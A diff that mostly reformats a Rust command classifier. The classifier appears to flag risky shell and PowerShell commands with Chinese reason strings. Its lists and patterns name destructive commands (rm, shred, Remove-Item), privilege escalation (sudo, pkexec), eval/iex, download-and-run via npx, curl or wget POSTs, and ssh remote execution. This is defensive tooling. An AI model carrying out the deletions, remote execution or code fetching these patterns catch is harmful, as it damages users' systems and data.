@@ -29,7 +29,9 @@ fn collect(command: &str, dialect: Dialect, depth: usize, out: &mut Vec<String>)
     for reason in &line.opaque {
         if !matches!(
             *reason,
-            "parameter expansion with operators" | "PowerShell hashtable" | "PowerShell input redirection"
+            "parameter expansion with operators"
+                | "PowerShell hashtable"
+                | "PowerShell input redirection"
         ) {
             out.push(format!("包含无法静态分析的结构（{reason}）"));
         }
@@ -67,7 +69,10 @@ fn simple_reasons(simple: &Simple, dialect: Dialect, depth: usize, out: &mut Vec
     let offset = argv.len() - rest.len();
     for runner in &argv[..offset] {
         let name = shell::program_name(runner);
-        if matches!(name.as_str(), "sudo" | "doas" | "runas" | "gsudo" | "su" | "pkexec") {
+        if matches!(
+            name.as_str(),
+            "sudo" | "doas" | "runas" | "gsudo" | "su" | "pkexec"
+        ) {
             out.push(format!("提权运行（{name}）"));
         } else if shell::is_assignment(runner) && !classify::harmless_variable(runner, true) {
             out.push(format!("修改影响子进程的环境变量（{}）", variable(runner)));
@@ -83,9 +88,9 @@ fn simple_reasons(simple: &Simple, dialect: Dialect, depth: usize, out: &mut Vec
     }
     // `"https://x/$id"` stays one word that is not an option; `$args` or an unquoted
     // expansion may split into or become options.
-    let dynamic_args = words[offset + 1..].iter().any(|w| {
-        w.dynamic && (!w.quoted || w.text.starts_with('$') || w.text.starts_with('-'))
-    });
+    let dynamic_args = words[offset + 1..]
+        .iter()
+        .any(|w| w.dynamic && (!w.quoted || w.text.starts_with('$') || w.text.starts_with('-')));
     argv_reasons(rest, dynamic_args, depth, out);
 }
 
@@ -103,11 +108,25 @@ fn scratch(target: &str) -> bool {
     if normalized.contains("..") {
         return false;
     }
-    let temp = std::env::temp_dir().to_string_lossy().replace('\\', "/").to_ascii_lowercase();
+    let temp = std::env::temp_dir()
+        .to_string_lossy()
+        .replace('\\', "/")
+        .to_ascii_lowercase();
     let temp = temp.trim_end_matches('/');
-    ["/tmp/", "/var/tmp/", "$tmpdir/", "${tmpdir}/", "$temp/", "$tmp/", "$env:temp/", "$env:tmp/", "%temp%/", "%tmp%/"]
-        .iter()
-        .any(|prefix| normalized.starts_with(prefix))
+    [
+        "/tmp/",
+        "/var/tmp/",
+        "$tmpdir/",
+        "${tmpdir}/",
+        "$temp/",
+        "$tmp/",
+        "$env:temp/",
+        "$env:tmp/",
+        "%temp%/",
+        "%tmp%/",
+    ]
+    .iter()
+    .any(|prefix| normalized.starts_with(prefix))
         || (!temp.is_empty() && normalized.starts_with(&format!("{temp}/")))
 }
 
@@ -135,70 +154,205 @@ fn dynamic_statement(words: &[Word], dialect: Dialect, depth: usize, out: &mut V
 }
 
 fn positional<'a>(args: &[&'a str]) -> Vec<&'a str> {
-    args.iter().copied().filter(|a| !a.starts_with('-')).collect()
+    args.iter()
+        .copied()
+        .filter(|a| !a.starts_with('-'))
+        .collect()
 }
 
 fn has_any(args: &[&str], flags: &[&str]) -> bool {
-    args.iter().any(|a| flags.iter().any(|f| a.eq_ignore_ascii_case(f)))
+    args.iter()
+        .any(|a| flags.iter().any(|f| a.eq_ignore_ascii_case(f)))
 }
 
 fn has_prefix(args: &[&str], prefixes: &[&str]) -> bool {
-    args.iter().any(|a| prefixes.iter().any(|p| a.starts_with(p)))
+    args.iter()
+        .any(|a| prefixes.iter().any(|p| a.starts_with(p)))
 }
 
 const DELETE: &[&str] = &[
-    "rm", "rmdir", "del", "erase", "rd", "unlink", "shred", "remove-item", "ri",
-    "clear-content", "clc", "remove-itemproperty", "rp", "clear-recyclebin",
+    "rm",
+    "rmdir",
+    "del",
+    "erase",
+    "rd",
+    "unlink",
+    "shred",
+    "remove-item",
+    "ri",
+    "clear-content",
+    "clc",
+    "remove-itemproperty",
+    "rp",
+    "clear-recyclebin",
 ];
 
 const MODIFY: &[&str] = &[
-    "mv", "move", "move-item", "mi", "ren", "rename", "rename-item", "rni", "cp", "copy",
-    "xcopy", "robocopy", "copy-item", "cpi", "ln", "mklink", "chmod", "chown", "chgrp",
-    "truncate", "install", "patch", "set-content", "add-content", "ac", "out-file",
-    "tee-object", "export-csv", "export-clixml", "new-itemproperty", "set-itemproperty", "sp",
-    "set-item", "si", "split", "csplit", "setfacl", "expand-archive", "compress-archive",
+    "mv",
+    "move",
+    "move-item",
+    "mi",
+    "ren",
+    "rename",
+    "rename-item",
+    "rni",
+    "cp",
+    "copy",
+    "xcopy",
+    "robocopy",
+    "copy-item",
+    "cpi",
+    "ln",
+    "mklink",
+    "chmod",
+    "chown",
+    "chgrp",
+    "truncate",
+    "install",
+    "patch",
+    "set-content",
+    "add-content",
+    "ac",
+    "out-file",
+    "tee-object",
+    "export-csv",
+    "export-clixml",
+    "new-itemproperty",
+    "set-itemproperty",
+    "sp",
+    "set-item",
+    "si",
+    "split",
+    "csplit",
+    "setfacl",
+    "expand-archive",
+    "compress-archive",
     "start-bitstransfer",
 ];
 
-const KILL: &[&str] = &["kill", "pkill", "killall", "taskkill", "stop-process", "spps", "tskill"];
+const KILL: &[&str] = &[
+    "kill",
+    "pkill",
+    "killall",
+    "taskkill",
+    "stop-process",
+    "spps",
+    "tskill",
+];
 
 const POWER: &[&str] = &[
-    "shutdown", "reboot", "halt", "poweroff", "restart-computer", "stop-computer",
+    "shutdown",
+    "reboot",
+    "halt",
+    "poweroff",
+    "restart-computer",
+    "stop-computer",
 ];
 
 const LAUNCH: &[&str] = &[
-    "start", "open", "xdg-open", "invoke-item", "ii", "start-process", "saps", "explorer",
+    "start",
+    "open",
+    "xdg-open",
+    "invoke-item",
+    "ii",
+    "start-process",
+    "saps",
+    "explorer",
 ];
 
 const SYSTEM: &[&str] = &[
-    "setx", "mount", "umount", "useradd", "userdel", "usermod", "passwd", "groupadd",
-    "chsh", "csrutil", "set-executionpolicy", "stop-service", "start-service",
-    "restart-service", "set-service", "new-service", "remove-service", "register-scheduledtask",
-    "unregister-scheduledtask", "install-module", "uninstall-module", "update-module",
-    "install-package", "uninstall-package", "add-appxpackage", "remove-appxpackage",
-    "enable-windowsoptionalfeature", "disable-windowsoptionalfeature", "set-alias", "new-alias",
+    "setx",
+    "mount",
+    "umount",
+    "useradd",
+    "userdel",
+    "usermod",
+    "passwd",
+    "groupadd",
+    "chsh",
+    "csrutil",
+    "set-executionpolicy",
+    "stop-service",
+    "start-service",
+    "restart-service",
+    "set-service",
+    "new-service",
+    "remove-service",
+    "register-scheduledtask",
+    "unregister-scheduledtask",
+    "install-module",
+    "uninstall-module",
+    "update-module",
+    "install-package",
+    "uninstall-package",
+    "add-appxpackage",
+    "remove-appxpackage",
+    "enable-windowsoptionalfeature",
+    "disable-windowsoptionalfeature",
+    "set-alias",
+    "new-alias",
 ];
 
 const CODE: &[&str] = &[
-    "eval", "iex", "invoke-expression", "invoke-command", "icm", "start-job", "add-type",
+    "eval",
+    "iex",
+    "invoke-expression",
+    "invoke-command",
+    "icm",
+    "start-job",
+    "add-type",
 ];
 
 const PACKAGE_MANAGERS: &[&str] = &[
     "npm", "pnpm", "yarn", "bun", "pip", "pip3", "pipx", "uv", "poetry", "conda", "mamba", "gem",
-    "bundle", "composer", "cargo", "go", "dotnet", "nuget", "apt", "apt-get", "yum", "dnf",
-    "brew", "choco", "winget", "scoop", "pacman", "zypper", "snap", "flatpak", "rustup", "deno",
-    "helm",
+    "bundle", "composer", "cargo", "go", "dotnet", "nuget", "apt", "apt-get", "yum", "dnf", "brew",
+    "choco", "winget", "scoop", "pacman", "zypper", "snap", "flatpak", "rustup", "deno", "helm",
 ];
 
 const INSTALL_VERBS: &[&str] = &[
-    "install", "i", "add", "remove", "rm", "uninstall", "un", "purge", "autoremove", "update",
-    "upgrade", "up", "ci", "link", "unlink", "prune", "dedupe", "reinstall", "downgrade",
-    "sync", "lock", "tidy", "get", "download", "create", "default", "self", "edit", "restore",
+    "install",
+    "i",
+    "add",
+    "remove",
+    "rm",
+    "uninstall",
+    "un",
+    "purge",
+    "autoremove",
+    "update",
+    "upgrade",
+    "up",
+    "ci",
+    "link",
+    "unlink",
+    "prune",
+    "dedupe",
+    "reinstall",
+    "downgrade",
+    "sync",
+    "lock",
+    "tidy",
+    "get",
+    "download",
+    "create",
+    "default",
+    "self",
+    "edit",
+    "restore",
 ];
 
 const REMOTE_VERBS: &[&str] = &[
-    "publish", "unpublish", "push", "yank", "login", "logout", "owner", "deprecate", "dist-tag",
-    "adduser", "token",
+    "publish",
+    "unpublish",
+    "push",
+    "yank",
+    "login",
+    "logout",
+    "owner",
+    "deprecate",
+    "dist-tag",
+    "adduser",
+    "token",
 ];
 
 /// Flags or a positional verb `name` uses to rewrite sources in place.
@@ -208,7 +362,16 @@ fn rewrites_sources(name: &str, args: &[&str]) -> bool {
     if has_any(args, &["--version", "-V", "--help", "-h"]) {
         return false;
     }
-    let checking = has_any(args, &["--check", "-check", "--diff", "--verify-no-changes", "--dry-run"]);
+    let checking = has_any(
+        args,
+        &[
+            "--check",
+            "-check",
+            "--diff",
+            "--verify-no-changes",
+            "--dry-run",
+        ],
+    );
     match name {
         "cargo" => {
             (sub == "fmt" && !checking)
@@ -241,7 +404,22 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
     let args: Vec<&str> = words[1..].iter().map(String::as_str).collect();
     let pos = positional(&args);
     let n = name.as_str();
-    if dynamic_args && matches!(n, "sort" | "uniq" | "find" | "sed" | "tree" | "curl" | "wget" | "rg" | "awk" | "tar" | "xargs") {
+    if dynamic_args
+        && matches!(
+            n,
+            "sort"
+                | "uniq"
+                | "find"
+                | "sed"
+                | "tree"
+                | "curl"
+                | "wget"
+                | "rg"
+                | "awk"
+                | "tar"
+                | "xargs"
+        )
+    {
         out.push(format!("参数含变量，无法确认不会写文件（{n}）"));
     }
     if DELETE.contains(&n) {
@@ -305,12 +483,25 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         "dd" if has_prefix(&args, &["of="]) => out.push("写入文件（dd）".into()),
         "attrib" if has_prefix(&args, &["+", "-"]) => out.push("修改文件属性（attrib）".into()),
         "icacls" | "cacls" | "takeown"
-            if n == "takeown" || has_any(&args, &["/grant", "/deny", "/remove", "/reset", "/setowner", "/restore"]) =>
+            if n == "takeown"
+                || has_any(
+                    &args,
+                    &[
+                        "/grant",
+                        "/deny",
+                        "/remove",
+                        "/reset",
+                        "/setowner",
+                        "/restore",
+                    ],
+                ) =>
         {
             out.push(format!("修改文件权限（{n}）"));
         }
         "sc" => {
-            if !pos.first().is_some_and(|s| s.to_ascii_lowercase().starts_with("query") || s.eq_ignore_ascii_case("qc")) {
+            if !pos.first().is_some_and(|s| {
+                s.to_ascii_lowercase().starts_with("query") || s.eq_ignore_ascii_case("qc")
+            }) {
                 out.push("修改服务或文件（sc）".into());
             }
         }
@@ -322,9 +513,35 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         }
         "systemctl" | "service" | "launchctl" => {
             let read = pos.iter().all(|s| {
-                matches!(*s, "status" | "show" | "cat" | "is-active" | "is-enabled" | "is-failed" | "list" | "print")
-                    || s.starts_with("list-")
-                    || !matches!(*s, "start" | "stop" | "restart" | "reload" | "enable" | "disable" | "mask" | "unmask" | "kill" | "load" | "unload" | "bootstrap" | "bootout" | "remove" | "daemon-reload")
+                matches!(
+                    *s,
+                    "status"
+                        | "show"
+                        | "cat"
+                        | "is-active"
+                        | "is-enabled"
+                        | "is-failed"
+                        | "list"
+                        | "print"
+                ) || s.starts_with("list-")
+                    || !matches!(
+                        *s,
+                        "start"
+                            | "stop"
+                            | "restart"
+                            | "reload"
+                            | "enable"
+                            | "disable"
+                            | "mask"
+                            | "unmask"
+                            | "kill"
+                            | "load"
+                            | "unload"
+                            | "bootstrap"
+                            | "bootout"
+                            | "remove"
+                            | "daemon-reload"
+                    )
             });
             if !read {
                 out.push(format!("修改系统服务（{n}）"));
@@ -339,7 +556,11 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         {
             out.push(format!("修改防火墙或网络设置（{n}）"));
         }
-        "defaults" if pos.first().is_some_and(|s| matches!(*s, "write" | "delete")) => {
+        "defaults"
+            if pos
+                .first()
+                .is_some_and(|s| matches!(*s, "write" | "delete")) =>
+        {
             out.push("修改系统偏好（defaults）".into());
         }
         "sed" => {
@@ -352,14 +573,19 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         "awk" | "gawk" | "nawk" | "mawk" => {
             let program = pos.first().copied().unwrap_or_default();
             if has_any(&args, &["-f", "-i"])
-                || ["system(", "| \"", "|\"", "> \"", ">\"", ">>", "print >", "printf >"]
-                    .iter()
-                    .any(|sign| program.contains(sign))
+                || [
+                    "system(", "| \"", "|\"", "> \"", ">\"", ">>", "print >", "printf >",
+                ]
+                .iter()
+                .any(|sign| program.contains(sign))
             {
                 out.push("awk 程序可能写文件或执行命令".into());
             }
         }
-        "sort" if has_prefix(&args, &["-o", "--output", "--compress-program"]) || has_any(&args, &["/o"]) => {
+        "sort"
+            if has_prefix(&args, &["-o", "--output", "--compress-program"])
+                || has_any(&args, &["/o"]) =>
+        {
             out.push("写入文件（sort -o）".into());
         }
         "uniq" if pos.len() > 1 => out.push("写入文件（uniq 输出文件）".into()),
@@ -379,7 +605,10 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
                         .iter()
                         .position(|a| matches!(*a, ";" | "\\;" | "+"))
                         .map_or(args.len(), |at| index + 1 + at);
-                    let inner: Vec<String> = args[index + 1..end].iter().map(|a| (*a).to_owned()).collect();
+                    let inner: Vec<String> = args[index + 1..end]
+                        .iter()
+                        .map(|a| (*a).to_owned())
+                        .collect();
                     argv_reasons(&inner, true, depth + 1, out);
                     index = end;
                 }
@@ -392,14 +621,29 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         }
         "tar" => {
             let first = args.first().copied().unwrap_or_default();
-            let cluster = if first.starts_with("--") { "" } else { first.trim_start_matches('-') };
-            if cluster.contains(['x', 'c', 'r', 'u']) || has_any(&args, &["--extract", "--create", "--append", "--delete", "--get"]) {
+            let cluster = if first.starts_with("--") {
+                ""
+            } else {
+                first.trim_start_matches('-')
+            };
+            if cluster.contains(['x', 'c', 'r', 'u'])
+                || has_any(
+                    &args,
+                    &["--extract", "--create", "--append", "--delete", "--get"],
+                )
+            {
                 out.push("解压或打包写文件（tar）".into());
             }
         }
-        "unzip" if !has_any(&args, &["-l", "-t", "-v", "-Z", "-p"]) => out.push("解压写文件（unzip）".into()),
+        "unzip" if !has_any(&args, &["-l", "-t", "-v", "-Z", "-p"]) => {
+            out.push("解压写文件（unzip）".into())
+        }
         "zip" => out.push("打包写文件（zip）".into()),
-        "7z" | "7za" | "7zr" if pos.first().is_some_and(|s| !matches!(*s, "l" | "t" | "i" | "h")) => {
+        "7z" | "7za" | "7zr"
+            if pos
+                .first()
+                .is_some_and(|s| !matches!(*s, "l" | "t" | "i" | "h")) =>
+        {
             out.push(format!("解压或打包写文件（{n}）"));
         }
         "gzip" | "gunzip" | "bzip2" | "bunzip2" | "xz" | "unxz" | "zstd" | "unzstd"
@@ -410,9 +654,14 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         "curl" => curl_reasons(&args, out),
         "wget" => {
             let to_stdout = has_any(&args, &["-O-", "-qO-", "--spider"])
-                || args.windows(2).any(|w| matches!(w[0], "-O" | "-qO") && w[1] == "-")
+                || args
+                    .windows(2)
+                    .any(|w| matches!(w[0], "-O" | "-qO") && w[1] == "-")
                 || has_prefix(&args, &["--output-document=-"]);
-            if has_prefix(&args, &["--post-data", "--post-file", "--method", "--body-data"]) {
+            if has_prefix(
+                &args,
+                &["--post-data", "--post-file", "--method", "--body-data"],
+            ) {
                 out.push("向远端发送修改请求（wget POST）".into());
             } else if !to_stdout {
                 out.push("下载文件到本地（wget）".into());
@@ -426,7 +675,9 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
                 .windows(2)
                 .find(|w| w[0].eq_ignore_ascii_case("-method"))
                 .map(|w| w[1].to_ascii_lowercase());
-            if method.as_deref().is_some_and(|m| !matches!(m, "get" | "head" | "options"))
+            if method
+                .as_deref()
+                .is_some_and(|m| !matches!(m, "get" | "head" | "options"))
                 || has_any(&args, &["-body", "-infile", "-form"])
             {
                 out.push(format!("向远端发送修改请求（{n}）"));
@@ -436,14 +687,36 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         "gh" => gh_reasons(&args, out),
         "docker" | "podman" | "nerdctl" => {
             let mut sub = pos.first().copied().unwrap_or_default();
-            if matches!(sub, "container" | "image" | "volume" | "network" | "system" | "compose" | "builder") {
+            if matches!(
+                sub,
+                "container" | "image" | "volume" | "network" | "system" | "compose" | "builder"
+            ) {
                 sub = pos.get(1).copied().unwrap_or_default();
             }
             if matches!(
                 sub,
-                "push" | "login" | "logout" | "rm" | "rmi" | "kill" | "stop" | "restart" | "pause"
-                    | "unpause" | "run" | "exec" | "start" | "create" | "cp" | "commit" | "prune"
-                    | "up" | "down" | "update" | "rename" | "attach"
+                "push"
+                    | "login"
+                    | "logout"
+                    | "rm"
+                    | "rmi"
+                    | "kill"
+                    | "stop"
+                    | "restart"
+                    | "pause"
+                    | "unpause"
+                    | "run"
+                    | "exec"
+                    | "start"
+                    | "create"
+                    | "cp"
+                    | "commit"
+                    | "prune"
+                    | "up"
+                    | "down"
+                    | "update"
+                    | "rename"
+                    | "attach"
             ) {
                 out.push(format!("修改容器或镜像（{n} {sub}）"));
             }
@@ -452,9 +725,28 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
             if pos.first().is_some_and(|s| {
                 matches!(
                     *s,
-                    "apply" | "create" | "delete" | "patch" | "replace" | "scale" | "rollout" | "edit"
-                        | "set" | "label" | "annotate" | "exec" | "cp" | "drain" | "cordon"
-                        | "uncordon" | "taint" | "run" | "expose" | "autoscale" | "attach" | "debug"
+                    "apply"
+                        | "create"
+                        | "delete"
+                        | "patch"
+                        | "replace"
+                        | "scale"
+                        | "rollout"
+                        | "edit"
+                        | "set"
+                        | "label"
+                        | "annotate"
+                        | "exec"
+                        | "cp"
+                        | "drain"
+                        | "cordon"
+                        | "uncordon"
+                        | "taint"
+                        | "run"
+                        | "expose"
+                        | "autoscale"
+                        | "attach"
+                        | "debug"
                 )
             }) {
                 out.push(format!("修改集群资源（{n} {}）", pos[0]));
@@ -462,7 +754,18 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         }
         "terraform" | "tofu" | "pulumi" => {
             if pos.first().is_some_and(|s| {
-                matches!(*s, "apply" | "destroy" | "import" | "taint" | "untaint" | "up" | "state" | "refresh" | "workspace")
+                matches!(
+                    *s,
+                    "apply"
+                        | "destroy"
+                        | "import"
+                        | "taint"
+                        | "untaint"
+                        | "up"
+                        | "state"
+                        | "refresh"
+                        | "workspace"
+                )
             }) {
                 out.push(format!("修改基础设施（{n} {}）", pos[0]));
             }
@@ -480,7 +783,22 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         }
         "az" | "gcloud" => {
             if pos.iter().any(|s| {
-                matches!(*s, "create" | "delete" | "update" | "set" | "add" | "remove" | "deploy" | "start" | "stop" | "restart" | "import" | "apply" | "upload")
+                matches!(
+                    *s,
+                    "create"
+                        | "delete"
+                        | "update"
+                        | "set"
+                        | "add"
+                        | "remove"
+                        | "deploy"
+                        | "start"
+                        | "stop"
+                        | "restart"
+                        | "import"
+                        | "apply"
+                        | "upload"
+                )
             }) {
                 out.push(format!("修改云资源（{n}）"));
             }
@@ -488,7 +806,10 @@ fn argv_reasons(words: &[String], dynamic_args: bool, depth: usize, out: &mut Ve
         "ssh" | "plink" => out.push(format!("在远程主机执行命令（{n}）")),
         "scp" | "sftp" | "rsync" | "ftp" => out.push(format!("复制文件（{n}）")),
         "twine" if pos.first() == Some(&"upload") => out.push("发布到远端（twine upload）".into()),
-        "npx" | "bunx" | "uvx" | "pnpx" if has_any(&args, &["-y", "--yes", "-p", "--package"]) || matches!(n, "uvx" | "bunx") => {
+        "npx" | "bunx" | "uvx" | "pnpx"
+            if has_any(&args, &["-y", "--yes", "-p", "--package"])
+                || matches!(n, "uvx" | "bunx") =>
+        {
             out.push(format!("下载并运行外部包（{n}）"));
         }
         "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "fish" | "cmd" | "pwsh" | "powershell" => {
@@ -522,30 +843,45 @@ fn curl_reasons(args: &[&str], out: &mut Vec<String>) {
         };
         let value = inline.or_else(|| args.get(index + 1).copied());
         match flag {
-            "-o" | "--output" | "-O" | "--remote-name" | "--remote-name-all" | "-D" | "--dump-header"
-            | "-c" | "--cookie-jar" | "--trace" | "--trace-ascii" | "--output-dir" => {
-                let named = matches!(flag, "-o" | "--output" | "-D" | "--dump-header" | "-c" | "--cookie-jar" | "--trace" | "--trace-ascii");
+            "-o" | "--output" | "-O" | "--remote-name" | "--remote-name-all" | "-D"
+            | "--dump-header" | "-c" | "--cookie-jar" | "--trace" | "--trace-ascii"
+            | "--output-dir" => {
+                let named = matches!(
+                    flag,
+                    "-o" | "--output"
+                        | "-D"
+                        | "--dump-header"
+                        | "-c"
+                        | "--cookie-jar"
+                        | "--trace"
+                        | "--trace-ascii"
+                );
                 if !(named && value.is_some_and(|v| v == "-" || scratch(v))) {
                     writes = true;
                 }
             }
-            "-X" | "--request" => {
-                match value.map(str::to_ascii_uppercase).as_deref() {
-                    Some("GET" | "HEAD" | "OPTIONS") | None => {}
-                    Some("POST") => post = true,
-                    Some(_) => remote = true,
-                }
-            }
+            "-X" | "--request" => match value.map(str::to_ascii_uppercase).as_deref() {
+                Some("GET" | "HEAD" | "OPTIONS") | None => {}
+                Some("POST") => post = true,
+                Some(_) => remote = true,
+            },
             "-G" | "--get" => get = true,
             "-T" | "--upload-file" => remote = true,
-            f if f.starts_with("-d") || f.starts_with("--data") || f.starts_with("--json")
-                || f == "-F" || f.starts_with("--form") => post = true,
+            f if f.starts_with("-d")
+                || f.starts_with("--data")
+                || f.starts_with("--json")
+                || f == "-F"
+                || f.starts_with("--form") =>
+            {
+                post = true
+            }
             _ => {}
         }
         index += 1;
     }
     // A POST to this machine (a local model or dev server) is a query, not a remote change.
-    let local = args.iter().any(|a| loopback(a)) && !args.iter().any(|a| a.contains("://") && !loopback(a));
+    let local =
+        args.iter().any(|a| loopback(a)) && !args.iter().any(|a| a.contains("://") && !loopback(a));
     if remote || (post && !get && !local) {
         out.push("向远端发送修改请求（curl）".into());
     }
@@ -558,7 +894,13 @@ fn loopback(arg: &str) -> bool {
     let host = arg.split_once("://").map_or(arg, |(_, rest)| rest);
     ["127.0.0.1", "localhost", "[::1]", "0.0.0.0"]
         .iter()
-        .any(|local| host.starts_with(local) && host[local.len()..].chars().next().is_none_or(|c| matches!(c, ':' | '/')))
+        .any(|local| {
+            host.starts_with(local)
+                && host[local.len()..]
+                    .chars()
+                    .next()
+                    .is_none_or(|c| matches!(c, ':' | '/'))
+        })
 }
 
 fn git_reasons(args: &[&str], out: &mut Vec<String>) {
@@ -569,39 +911,71 @@ fn git_reasons(args: &[&str], out: &mut Vec<String>) {
         out.push("git 参数无法分析".into());
         return;
     };
-    let flagged = |flags: &[&str]| rest.iter().any(|a| flags.contains(a) || a.starts_with("--force"));
+    let flagged = |flags: &[&str]| {
+        rest.iter()
+            .any(|a| flags.contains(a) || a.starts_with("--force"))
+    };
     let first = rest.first().copied().unwrap_or_default();
     match sub {
         "push" => out.push("推送到远端（git push）".into()),
         "tag" if flagged(&["-f", "-d", "--delete"]) => out.push("删除或覆盖标签（git tag）".into()),
-        "branch" if flagged(&["-f", "-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C"]) => {
+        "branch"
+            if flagged(&[
+                "-f", "-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C",
+            ]) =>
+        {
             out.push("删除、重命名或覆盖分支（git branch）".into());
         }
         "config" => out.push("修改 git 配置（git config）".into()),
-        "archive" | "format-patch" | "bundle" if flagged(&["-o"]) || rest.iter().any(|a| a.starts_with("--output")) => {
+        "archive" | "format-patch" | "bundle"
+            if flagged(&["-o"]) || rest.iter().any(|a| a.starts_with("--output")) =>
+        {
             out.push(format!("写入文件（git {sub}）"));
         }
         "bundle" if first == "create" => out.push("写入文件（git bundle）".into()),
-        "reset" if flagged(&["--hard", "--soft", "--mixed", "--merge", "--keep"])
-            || (rest.iter().any(|a| !a.starts_with('-')) && !rest.contains(&"--")) =>
+        "reset"
+            if flagged(&["--hard", "--soft", "--mixed", "--merge", "--keep"])
+                || (rest.iter().any(|a| !a.starts_with('-')) && !rest.contains(&"--")) =>
         {
             out.push("移动分支指针或丢弃改动（git reset）".into());
         }
         "checkout" | "switch" | "restore" | "clean" | "rm" | "mv" | "rebase" | "merge" | "pull"
-        | "cherry-pick" | "revert" | "am" | "apply" | "filter-branch" | "filter-repo" | "update-ref"
-        | "replace" | "gc" | "prune" | "repack" | "symbolic-ref" | "update-index" | "read-tree" => {
+        | "cherry-pick" | "revert" | "am" | "apply" | "filter-branch" | "filter-repo"
+        | "update-ref" | "replace" | "gc" | "prune" | "repack" | "symbolic-ref"
+        | "update-index" | "read-tree" => {
             out.push(format!("修改工作区或仓库历史（git {sub}）"));
         }
         "stash" if !matches!(first, "list" | "show") => out.push("修改工作区（git stash）".into()),
-        "remote" if matches!(first, "add" | "remove" | "rm" | "rename" | "set-url" | "set-head" | "set-branches" | "prune") => {
+        "remote"
+            if matches!(
+                first,
+                "add"
+                    | "remove"
+                    | "rm"
+                    | "rename"
+                    | "set-url"
+                    | "set-head"
+                    | "set-branches"
+                    | "prune"
+            ) =>
+        {
             out.push("修改远端配置（git remote）".into());
         }
-        "worktree" if matches!(first, "remove" | "prune" | "move") => out.push("删除或移动工作树（git worktree）".into()),
+        "worktree" if matches!(first, "remove" | "prune" | "move") => {
+            out.push("删除或移动工作树（git worktree）".into())
+        }
         "submodule" if matches!(first, "update" | "deinit" | "sync" | "set-url") => {
             out.push("修改子模块（git submodule）".into());
         }
-        "reflog" if matches!(first, "expire" | "delete") => out.push("删除 reflog（git reflog）".into()),
-        "notes" if matches!(first, "remove" | "prune" | "edit" | "add" | "append" | "copy") => {
+        "reflog" if matches!(first, "expire" | "delete") => {
+            out.push("删除 reflog（git reflog）".into())
+        }
+        "notes"
+            if matches!(
+                first,
+                "remove" | "prune" | "edit" | "add" | "append" | "copy"
+            ) =>
+        {
             out.push("修改 git notes".into());
         }
         // ls-remote, archive to stdout, add, commit, fetch, clone, init, tag/branch
@@ -626,10 +1000,40 @@ fn gh_reasons(args: &[&str], out: &mut Vec<String>) {
     let verb = pos.get(1).copied().unwrap_or_default();
     if matches!(
         verb,
-        "create" | "edit" | "delete" | "merge" | "close" | "reopen" | "comment" | "review" | "ready"
-            | "upload" | "fork" | "rename" | "archive" | "unarchive" | "sync" | "enable" | "disable"
-            | "run" | "rerun" | "cancel" | "set" | "remove" | "add" | "login" | "logout" | "refresh"
-            | "install" | "upgrade" | "lock" | "unlock" | "transfer" | "pin" | "unpin" | "checkout"
+        "create"
+            | "edit"
+            | "delete"
+            | "merge"
+            | "close"
+            | "reopen"
+            | "comment"
+            | "review"
+            | "ready"
+            | "upload"
+            | "fork"
+            | "rename"
+            | "archive"
+            | "unarchive"
+            | "sync"
+            | "enable"
+            | "disable"
+            | "run"
+            | "rerun"
+            | "cancel"
+            | "set"
+            | "remove"
+            | "add"
+            | "login"
+            | "logout"
+            | "refresh"
+            | "install"
+            | "upgrade"
+            | "lock"
+            | "unlock"
+            | "transfer"
+            | "pin"
+            | "unpin"
+            | "checkout"
             | "develop"
     ) || (pos.first() == Some(&"workflow") && verb == "run")
     {
@@ -644,7 +1048,14 @@ fn package_reasons(name: &str, args: &[&str], pos: &[&str], out: &mut Vec<String
         return;
     }
     // `npm run x`, `yarn build`: project scripts run without asking.
-    if matches!(name, "npm" | "pnpm" | "yarn" | "bun") && lead.first().is_some_and(|v| matches!(*v, "run" | "run-script" | "test" | "t" | "start" | "exec" | "x")) {
+    if matches!(name, "npm" | "pnpm" | "yarn" | "bun")
+        && lead.first().is_some_and(|v| {
+            matches!(
+                *v,
+                "run" | "run-script" | "test" | "t" | "start" | "exec" | "x"
+            )
+        })
+    {
         if matches!(lead.first(), Some(&("exec" | "x"))) && has_any(args, &["-y", "--yes"]) {
             out.push(format!("下载并运行外部包（{name} {}）", lead[0]));
         }
@@ -659,7 +1070,14 @@ fn package_reasons(name: &str, args: &[&str], pos: &[&str], out: &mut Vec<String
         return;
     }
     // Build tools whose first word is a build step, not a package verb.
-    if matches!(name, "cargo" | "go" | "dotnet") && lead.first().is_some_and(|v| matches!(*v, "build" | "test" | "run" | "check" | "bench" | "doc" | "vet" | "clippy")) {
+    if matches!(name, "cargo" | "go" | "dotnet")
+        && lead.first().is_some_and(|v| {
+            matches!(
+                *v,
+                "build" | "test" | "run" | "check" | "bench" | "doc" | "vet" | "clippy"
+            )
+        })
+    {
         return;
     }
     if name == "dotnet" && lead.first() == Some(&"restore") {
@@ -686,7 +1104,9 @@ fn nested_shell(words: &[String], name: &str, args: &[&str], depth: usize, out: 
             }
         }
         // A script file is a project script; no arguments reads code from stdin.
-        None if positional(args).is_empty() && !has_any(args, &["--version", "-v", "--help", "/?"]) => {
+        None if positional(args).is_empty()
+            && !has_any(args, &["--version", "-v", "--help", "/?"]) =>
+        {
             out.push(format!("从标准输入执行代码（{name}）"));
         }
         None => {}
@@ -717,7 +1137,10 @@ fn python_reasons(args: &[&str], out: &mut Vec<String>) {
             _ => return,
         }
     }
